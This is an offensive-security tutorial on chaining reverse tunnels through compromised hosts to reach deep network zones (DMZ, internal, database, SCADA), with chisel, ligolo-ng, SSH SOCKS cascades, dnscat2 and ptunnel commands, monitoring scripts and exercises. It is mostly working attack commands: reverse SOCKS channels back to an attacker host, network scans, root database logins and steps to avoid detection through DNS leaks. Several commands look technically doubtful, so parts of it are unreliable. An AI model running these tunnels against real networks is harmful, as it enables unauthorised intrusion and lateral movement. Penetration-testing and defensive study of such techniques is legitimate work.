# Double Pivoting and Multi-Hop Tunneling Guide

> Advanced guide to constructing double-pivot and multi-hop tunnel chains using chisel, ligolo-ng, and SOCKS cascade techniques. Covers deep network traversal through DMZ, internal, and restricted zones with multiple compromised pivot hosts.

## Introduction

Single-hop pivoting connects the attacker to one internal network segment through a compromised host. However, real enterprise networks are segmented into multiple zones -- DMZ, production, database tier, management VLAN, and isolated SCADA networks -- each separated by firewalls and access control lists. Reaching the deepest network segments requires chaining tunnels through multiple pivot points, a technique known as double pivoting or multi-hop tunneling.

Double pivoting introduces significant complexity over single-hop tunnels. Each hop adds latency, reduces throughput, and increases the risk of tunnel failure. The choice of tunneling tool at each hop matters: some tools handle chaining natively while others require manual configuration. This guide covers the three primary approaches to multi-hop tunnel construction -- chisel chaining, ligolo-ng multi-hop, and SOCKS cascade -- with practical configurations for each scenario.

**Learning objectives**:

- Understand when and why double pivoting is necessary
- Construct two-hop and three-hop tunnel chains using chisel
- Configure ligolo-ng for transparent multi-hop pivoting with TUN interfaces
- Build SOCKS cascade chains with proxychains for arbitrary application routing
- Troubleshoot common multi-hop failure modes including MTU issues and DNS leaks
- Implement tunnel health monitoring across multiple hops

**Prerequisites**: Familiarity with single-hop tunneling (see `ssh-http-tunneling-pivoting.md`). Understanding of TCP/IP routing, SOCKS proxies, and TUN interfaces. Root access on attacker workstation for TUN creation.

---

## Practical Steps

### Step 1: Planning the Pivot Chain

Before deploying any tunnels, map the network topology from the initial foothold. Identify each network segment, the firewalls between them, and the pivot hosts that bridge segments.

```
Network topology example:

  Attacker (10.50.0.100)
       |
    [Internet]
       |
  DMZ Host (203.0.113.50 / 10.10.0.5)
       |  --- Firewall allows DMZ to Internal only
  Internal Host (10.10.0.100 / 10.20.0.5)
       |  --- Firewall allows Internal to DB tier only
  Database Host (10.20.0.50)
```

Planning checklist:

1. Identify the IP addresses of each pivot host on both network interfaces
2. Determine which protocols are allowed between segments (SSH, HTTP, DNS, ICMP)
3. Note the firewall rules between each zone (which ports, which directions)
4. Select the optimal tunnel type for each hop based on allowed protocols
5. Calculate the expected latency budget (each hop adds 20-100ms typical)

### Step 2: Chisel Double Pivot -- HTTP Tunnel Chain

Chisel is the most straightforward tool for multi-hop tunneling because it supports nested SOCKS proxy configurations. The key principle: each pivot host runs both a chisel client (connecting outward) and a chisel server (accepting connections from the next hop inward).

**Hop 1: Attacker to DMZ Host**

```bash
# On attacker machine: start chisel server
chisel server -p 8080 --reverse --socks5 --auth pivot1:secret123

# On DMZ host (203.0.113.50): connect back to attacker
./chisel client --auth pivot1:secret123 http://10.50.0.100:8080 R:socks

# Verify: attacker now has SOCKS proxy on 127.0.0.1:1080
# Test: proxychains4 curl http://10.10.0.100
```

The DMZ host establishes a reverse SOCKS proxy back to the attacker. All traffic from the attacker through port 1080 routes through the DMZ host.

**Hop 2: DMZ to Internal Network**

```bash
# On DMZ host: start a second chisel server for internal pivoting
./chisel server -p 9090 --reverse --socks5 --auth pivot2:secret456

# On internal host (10.10.0.100): connect to DMZ chisel server
./chisel client --auth pivot2:secret456 http://10.10.0.5:9090 R:socks

# DMZ host now has SOCKS proxy on 127.0.0.1:1080 (from internal host)
```

**Attacker Configuration: Chain Through Both Hops**

```bash
# Configure proxychains to chain through both SOCKS proxies
cat > /etc/proxychains4.conf << 'EOF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
EOF

# Start a local relay that forwards through the first SOCKS to reach DMZ chisel server
# Use socat to create a second SOCKS entry point
socat TCP-LISTEN:1081,reuseaddr,fork SOCKS5:127.0.0.1:127.0.0.1:1080

# Alternatively, configure chisel on attacker to forward to DMZ's internal SOCKS
chisel client --auth pivot1:secret123 http://127.0.0.1:8080 1081:socks

# Test double-hop connectivity
proxychains4 curl http://10.20.0.50
proxychains4 nmap -sT -Pn 10.20.0.0/24 -p 22,80,443,3306
```

The strict_chain directive ensures traffic flows through both proxies sequentially. The first SOCKS proxy (1080) routes through the DMZ host; the second SOCKS proxy (1081, which is forwarded through the DMZ to reach the internal host's SOCKS) routes through the internal host to the database tier.

### Step 3: Ligolo-ng Multi-Hop Pivoting

Ligolo-ng provides a more elegant solution for multi-hop pivoting through its TUN interface. Each hop gets its own ligolo-ng relay, and the operator manages all tunnels from a single interface.

**Setup Ligolo-ng Infrastructure**

```bash
# On attacker machine: start ligolo-ng proxy
sudo ./proxy -selfcert -laddr 0.0.0.0:9001

# On DMZ host: connect to ligolo-ng proxy
./agent -connect 10.50.0.100:9001 -ignore-cert

# In ligolo-ng console (attacker):
# ligolo-ng > session
# Select the DMZ agent session
# ligolo-ng > ifconfig
# Note the DMZ host's internal IP: 10.10.0.5
# ligolo-ng > start --tun ligolo1
```

**Adding the Second Hop**

```bash
# Start a second ligolo-ng proxy instance on a different port for the internal host
# The second proxy must be reachable through the first tunnel

# On attacker machine: start second proxy through the first tunnel
# Method 1: Use socat to expose second proxy through first tunnel
sudo socat TCP-LISTEN:9002,reuseaddr,fork TCP:10.10.0.5:9002

# On DMZ host: start a relay/proxy that the internal host can connect to
# Or: use ligolo-ng's built-in relay feature
./agent -relay -connect 10.50.0.100:9001 -ignore-cert

# On internal host: connect through DMZ to second proxy
./agent -connect 10.10.0.5:9002 -ignore-cert

# In second ligolo-ng console:
# ligolo-ng > session
# Select internal host session
# ligolo-ng > start --tun ligolo2
# Add route for database tier: ip route add 10.20.0.0/24 dev ligolo2
```

**Routing Through Multiple TUN Interfaces**

```bash
# Add routes for each network segment through the appropriate TUN
sudo ip route add 10.10.0.0/24 dev ligolo1    # DMZ -> Internal via first tunnel
sudo ip route add 10.20.0.0/24 dev ligolo2    # Internal -> DB via second tunnel

# Verify routing
ip route show | grep ligolo
# 10.10.0.0/24 dev ligolo1 scope link
# 10.20.0.0/24 dev ligolo2 scope link

# Test connectivity through the chain
nmap -sT -Pn 10.20.0.50 -p 3306
ssh database-user@10.20.0.50
```

Ligolo-ng's advantage over chisel chains is the transparent Layer 3 routing. Tools do not need SOCKS proxy configuration -- they route directly through the TUN interfaces as if the target networks were locally connected.

### Step 4: SOCKS Cascade Construction

For environments where neither chisel nor ligolo-ng can be deployed, SOCKS cascade using SSH dynamic forwarding and socat relays provides a universal fallback.

**Building the Cascade**

```bash
# Hop 1: SSH dynamic forward to DMZ host
ssh -D 1080 -N -f user@203.0.113.50

# Through first SOCKS: reach internal host and create second SOCKS
# Method: SSH through SOCKS proxy to internal host
ssh -o ProxyCommand="nc -X 5 -x 127.0.0.1:1080 %h %p" -D 1081 -N -f user@10.10.0.100

# Through second SOCKS: reach database host
ssh -o ProxyCommand="nc -X 5 -x 127.0.0.1:1081 %h %p" -D 1082 -N -f user@10.20.0.50

# Configure proxychains to use the final SOCKS proxy in the chain
cat > /etc/proxychains4.conf << 'EOF'
strict_chain
proxy_dns
tcp_read_time_out 20000
tcp_connect_time_out 10000
[ProxyList]
socks5 127.0.0.1 1082
EOF

# Test through cascade
proxychains4 mysql -h 10.20.0.50 -u root -p
```

**Important**: Each SSH -D SOCKS proxy in the cascade connects through the previous one. The final proxy (1082) routes traffic through three hops: local -> DMZ -> internal -> database. The proxychains configuration only needs the final proxy because the SSH tunnel itself handles the chaining.

### Step 5: Three-Hop Tunnel with Mixed Protocols

In highly restricted environments, different hops may require different tunneling protocols based on what is permitted between segments.

```
Hop 1: Attacker -> DMZ (HTTPS allowed)
  Tool: chisel over HTTP/HTTPS
  
Hop 2: DMZ -> Internal (only DNS allowed)
  Tool: dnscat2 DNS tunnel
  
Hop 3: Internal -> SCADA (only ICMP allowed)
  Tool: ptunnel ICMP tunnel
```

**Mixed Protocol Chain Configuration**

```bash
# Hop 1: chisel HTTPS tunnel to DMZ
chisel server -p 443 --reverse --tls --auth hop1:key1
# On DMZ: chisel client --auth hop1:key1 https://attacker:443 R:socks

# Hop 2: dnscat2 through the chisel SOCKS proxy to reach internal host
# dnscat2 server on attacker (listening through chisel tunnel)
proxychains4 ruby dnscat2.rb tunnel.example.com

# On internal host (deployed through chisel tunnel):
proxychains4 ./dnscat --secret abc123 tunnel.example.com

# Hop 3: ptunnel through both tunnels to reach SCADA network
# On internal host: ptunnel client
proxychains4 sudo ptunnel -p 10.20.0.5 -lp 2222 -da 10.30.0.1 -dp 22

# From attacker: SSH through all three hops
proxychains4 ssh -p 2222 user@127.0.0.1
```

### Step 6: Tunnel Health Monitoring and Failover

Multi-hop tunnels are fragile -- any hop failing breaks the entire chain. Implement monitoring at each hop.

```bash
# Health monitor script for multi-hop chain
cat > multi_hop_monitor.sh << 'SCRIPT'
#!/bin/bash

check_hop() {
  local hop_name=$1
  local proxy_port=$2
  local target=$3
  
  if curl -s --connect-timeout 5 --socks5 127.0.0.1:$proxy_port http://$target >/dev/null 2>&1; then
    echo "[$(date '+%H:%M:%S')] $hop_name: OK (port $proxy_port -> $target)"
    return 0
  else
    echo "[$(date '+%H:%M:%S')] $hop_name: FAIL (port $proxy_port -> $target)"
    return 1
  fi
}

# Check each hop independently
check_hop "Hop1-DMZ" 1080 "10.10.0.5"
check_hop "Hop2-Internal" 1081 "10.20.0.5"
check_hop "Hop3-Database" 1082 "10.20.0.50"

# Check full chain
if proxychains4 curl -s --connect-timeout 10 http://10.20.0.50 >/dev/null 2>&1; then
  echo "[$(date '+%H:%M:%S')] Full chain: OK"
else
  echo "[$(date '+%H:%M:%S')] Full chain: FAIL - check individual hops"
fi
SCRIPT
chmod +x multi_hop_monitor.sh

# Run continuously
watch -n 30 ./multi_hop_monitor.sh
```

**Failover Strategy**

```bash
# Dynamic chain with failover (proxychains dynamic mode)
cat > /etc/proxychains4-failover.conf << 'EOF'
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
# Primary path through DMZ-1
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
# Backup: alternative DMZ host
socks5 127.0.0.1 2080
socks5 127.0.0.1 2081
EOF
```

### Step 7: MTU and Performance Optimization

Each tunnel encapsulation adds overhead, reducing effective MTU and throughput. With two hops, the cumulative overhead can cause fragmentation and connectivity issues.

```bash
# Check MTU at each hop
# On each pivot host:
ip link show | grep mtu

# Reduce MTU to prevent fragmentation across multiple encapsulations
# On TUN interfaces:
sudo ip link set ligolo1 mtu 1400
sudo ip link set ligolo2 mtu 1300

# For SSH tunnels, set MTU in the SSH config
ssh -o Tunnel=point-to-point -w 0:1 -o "TunnelDevice=any:any" user@pivot

# Test for MTU issues with ping
ping -M do -s 1400 10.20.0.50  # Should work if MTU is correct
ping -M do -s 1472 10.20.0.50  # Standard 1500 MTU test

# Measure throughput through each hop and the full chain
# Single hop:
iperf3 -c 10.10.0.100 --connect-timeout 5000
# Through full chain:
proxychains4 iperf3 -c 10.20.0.50 --connect-timeout 5000
```

### Step 8: DNS Leak Prevention in Multi-Hop Chains

DNS queries that bypass the tunnel chain can reveal internal hostnames and alert network monitoring.

```bash
# Ensure proxychains resolves DNS through the chain
# Verify: proxy_dns is set in proxychains4.conf
grep proxy_dns /etc/proxychains4.conf

# Test for DNS leaks: run dig through the tunnel and capture on the local interface
# Terminal 1: capture DNS on local interface
tcpdump -i eth0 port 53 -w dns_leak_test.pcap

# Terminal 2: resolve through tunnel
proxychains4 dig @10.20.0.1 internal-host.corp.local

# Terminal 1: check capture -- should be empty if no leak
tcpdump -r dns_leak_test.pcap
# If packets appear, DNS is leaking outside the tunnel

# Fix: force all DNS through the tunnel
echo "nameserver 10.20.0.1" | sudo tee /etc/resolv.conf.ligolo
sudo mount --bind /etc/resolv.conf.ligolo /etc/resolv.conf
```

---

## Hands-on Exercises

### Exercise 1: Basic Double Pivot with Chisel

**Scenario**: You have compromised a DMZ web server (192.168.100.50) and discovered an internal file server (10.10.10.20) through it. The file server can reach a database server (10.10.20.10) on port 3306.

1. Set up chisel server on your attacker machine
2. Deploy chisel client on the DMZ web server with reverse SOCKS
3. Through the first SOCKS proxy, deploy chisel client on the file server
4. Configure proxychains to chain through both SOCKS proxies
5. Connect to the MySQL database through the double pivot
6. Document the full tunnel chain configuration

**Expected outcome**: Successful MySQL connection to 10.10.20.10:3306 through two chisel hops. Verify by running `SELECT @@hostname;` and confirming it shows the database server hostname.

### Exercise 2: Ligolo-ng Three-Hop Pivot

**Scenario**: A corporate network has three segments: public DMZ (172.16.1.0/24), application tier (172.16.2.0/24), and database tier (172.16.3.0/24). You have shell access on hosts at each boundary.

1. Start ligolo-ng proxy on attacker workstation
2. Connect DMZ host as first agent, establish TUN interface ligolo1
3. Through ligolo1, connect application tier host as second agent with TUN ligolo2
4. Add routes for each network segment to the appropriate TUN
5. Scan the database tier through the three-hop tunnel
6. Verify no DNS leaks occur through the chain

**Expected outcome**: Full Layer 3 connectivity to all three network segments. Nmap scan results from the database tier confirming tunnel functionality. DNS resolution working through the tunnel without leaks.

### Exercise 3: SOCKS Cascade Failover

**Scenario**: You have two independent paths to an internal network: one through a compromised Linux server, another through a compromised Windows workstation. Build a redundant tunnel chain.

1. Establish SSH SOCKS proxy through the Linux server (port 1080)
2. Establish chisel SOCKS proxy through the Windows workstation (port 2080)
3. Configure proxychains with dynamic_chain for automatic failover
4. Test connectivity through the primary path
5. Simulate primary path failure (kill the SSH tunnel)
6. Verify automatic failover to the backup path

**Expected outcome**: Connectivity maintained after primary path failure. proxychains automatically routes through the backup SOCKS proxy. Logs show the failover event with timestamps.

---

## References

1. **Chisel Documentation**: https://github.com/jpillora/chisel -- HTTP tunnel with SOCKS5 support, authentication, and TLS
2. **Ligolo-ng Documentation**: https://github.com/nicocha30/ligolo-ng -- Transparent proxy with TUN interface for pivoting
3. **proxychains-ng**: https://github.com/rofl0r/proxychains-ng -- SOCKS/HTTP proxy chaining for any application
4. **MITRE ATT&CK T1090.001 - Internal Proxy**: https://attack.mitre.org/techniques/T1090/001/ -- Multi-hop proxy techniques
5. **MITRE ATT&CK T1090.002 - External Proxy**: https://attack.mitre.org/techniques/T1090/002/ -- External proxy forwarding
6. **SANS Pivoting Techniques**: https://www.sans.org/blog/pivot-to-bypass-network-segmentation/ -- Network segmentation bypass
7. **HackTricks Pivoting**: https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding -- Comprehensive tunneling reference
8. **0xdf Hack Stuff - Pivoting**: https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf.html -- Chisel and SSF tunneling walkthrough
